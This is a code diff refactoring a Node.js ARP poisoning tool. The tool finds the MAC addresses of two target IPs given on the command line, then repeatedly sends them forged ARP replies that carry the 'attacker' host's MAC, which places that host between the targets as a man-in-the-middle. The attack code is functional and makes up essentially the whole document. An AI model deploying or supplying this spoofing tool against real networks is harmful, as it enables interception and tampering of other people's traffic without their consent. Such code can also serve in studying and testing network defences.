@@ -5,6 +5,7 @@ var Cap = require('cap').Cap,
   timers = require("timers"),
   device = Cap.findDevice(ip.address()),
   getmac = require('getmac').getMac,
+  Q = require('q'),
   filter = 'arp',
   bufSize = 10 * 1024 * 1024,
   socketBuffer = new Buffer(65535),
@@ -17,10 +18,10 @@ var Cap = require('cap').Cap,
     mac: null
   };
 
-var target1 = {},
-  target2 = {},
+var target1 = { ip: null, mac: null },
+  target2 = { ip: null, mac: null },
   interval = null;
-
+var targets = [target1, target2]
 if(process.argv.length > 1) {
   target1.ip = process.argv[2];
   target2.ip = process.argv[3];
@@ -29,48 +30,56 @@ if(process.argv.length > 1) {
   }
 }
 
-getmac(function(err, macAddr) {
-  // Request example
-  var target1_mac, target2_mac, response;
-  attacker.mac = macAddr;
+Q.nfcall(findOurHardwareAddress)
+  .then(findTargetHardwareAddresses)
+  .then(function() {
+    if(target1.mac !== null && target2.mac !== null) {
+      console.log("\nSending single pair of ARP replies");
+      spoofBothWays(target1, target2, attacker.mac);
 
-  arpRequest(target1, (buf, close) => {
-    var response = createARPPacket(buf);
-    if(response.arp.operation.readInt16BE(0) !== OPERATION.REPLY) {
-      return;
-    }
-
-    target1.mac = buf2macString(response.arp.sender_mac);
-    close();
-    console.log("MAC found for target 1:\t", target1.mac);
-
-    arpRequest(target2, (buf, close) => {
-      response = createARPPacket(buf.current);
-      target2.mac = buf2macString(response.arp.sender_mac);
-      close();
-      console.log("MAC found for target 2:\t", target2.mac);
-      // Poisoning example
-      if(target1 !== null && target2 !== null) {
-        if(interval !== null) {
-          console.log("\nStarting ARP replies every " + interval + " milliseconds");
-          setInterval(spoofBothWays, interval, target1, target2, macAddr);
-        }
-
-        spoofBothWays(target1, target2, macAddr);
-
-        if(interval === null) {
-          process.exit();
-        } else {
-          // Stick around for the interval
-        }
+      if(interval !== null) {
+        console.log("\nSending additional ARP replies every " + interval + " milliseconds");
+        setInterval(spoofBothWays, interval, target1, target2);
       }
+
+      if(interval === null) {
+        process.exit();
+      } else {
+        // Stick around for the interval
+      }
+    }
+  });
+
+
+
+function findOurHardwareAddress(next) {
+  // Finds the hardware (MAC) addresses of the host and targets
+  getmac((err, mac) => {
+    console.log("Attacker MAC:", mac);
+    attacker.mac = mac;
+    next();
+  });
+}
+
+function findTargetHardwareAddresses(next) {
+  var deferred = Q.defer();
+
+  arpRequest(target1, function (mac) {
+    target1.mac = mac;
+
+    arpRequest(target2, function (mac) {
+      target2.mac = mac;
+
+      deferred.resolve();
     });
   });
-});
 
-var spoofBothWays = (target1, target2, mac) => {
-  spoof(target1, target2, mac);
-  spoof(target2, target1, mac);
+  return deferred.promise;
+};
+
+var spoofBothWays = (target1, target2) => {
+  spoof(target1, target2);
+  spoof(target2, target1);
 };
 
 var spoof = function (src, dst, mac) {
@@ -82,28 +91,16 @@ var spoof = function (src, dst, mac) {
   setMac(packet.arp.target_mac, dst.mac);
   setMac(packet.eth.target_mac, dst.mac);
 
-  setMac(packet.arp.sender_mac, mac);
-  setMac(packet.eth.sender_mac, mac);
+  setMac(packet.arp.sender_mac, attacker.mac);
+  setMac(packet.eth.sender_mac, attacker.mac);
 
   setIP(packet.arp.sender_ip, src.ip);
   setIP(packet.arp.target_ip, dst.ip);
 
   send(packet.buffer);
-
-
-  // Fix our own ARP stack
-  /*setMac(packet.arp.target_mac, attacker.mac);
-  setMac(packet.eth.target_mac, attacker.mac);
-  setIP(packet.arp.target_ip, attacker.ip);
-
-  setMac(packet.eth.sender_mac, dst.mac);
-  setMac(packet.arp.sender_mac, dst.mac);
-  setIP(packet.arp.sender_ip, dst.ip);
-
-  send(packet.buffer);*/
 };
 
-var arpRequest = function(target, callback) {
+var arpRequest = function(target, next) {
   var c = new Cap();
   var packet = createARPPacket();
 
@@ -114,16 +111,30 @@ var arpRequest = function(target, callback) {
 
   setMac(packet.eth.sender_mac, attacker.mac);
   setMac(packet.arp.sender_mac, attacker.mac);
-
   setIP(packet.arp.sender_ip, attacker.ip);
   setIP(packet.arp.target_ip, target.ip);
 
   c.open(device, filter, bufSize, socketBuffer);
   c.setMinBytes(42); // Length of an ARP packet
-  console.log("\n\nSending ARP Request for ", target.ip);
+
+  console.log("Sending ARP Request for ", target.ip);
   c.send(packet.buffer, packet.buffer.length);
+
   c.on("packet", (nbytes) => {
-    callback(socketBuffer.slice(0,nbytes), () => { c.close(); });
+    var response = createARPPacket(socketBuffer.slice(0, nbytes));
+
+    if(response.arp.operation.readInt16BE(0) === OPERATION.REPLY) {
+      var mac = buf2macString(response.arp.sender_mac);
+      var senderIp = buf2ipString(response.arp.sender_ip);
+
+      if(typeof mac !== "undefined" && senderIp === target.ip) {
+        next(mac);
+        c.close();
+
+        console.log(target.ip,"found at", mac);
+      }
+    } else {
+    }
   });
 };
 
@@ -155,6 +166,16 @@ var setIP = function(buffer, ip) {
 var buf2macString = function(buf) {
   // Takes a buffer containing a MAC address, gives it back as a hyphen-delimited string, e.g. "FF-FF-FF-FF-FF-FF"
   return buf.toString('hex').match(/.{1,2}/g).join('-');
+};
+
+var buf2ipString = function(buf) {
+  // Takes a 4-byte buffer, returns an ip, interpreting each byte as a segment
+  return [
+    buf.readUIntBE(0,1).toString(),
+    buf.readUIntBE(1,1).toString(),
+    buf.readUIntBE(2,1).toString(),
+    buf.readUIntBE(3,1).toString()].join(".");
+
 };
 
 var createARPPacket = function(buf) {
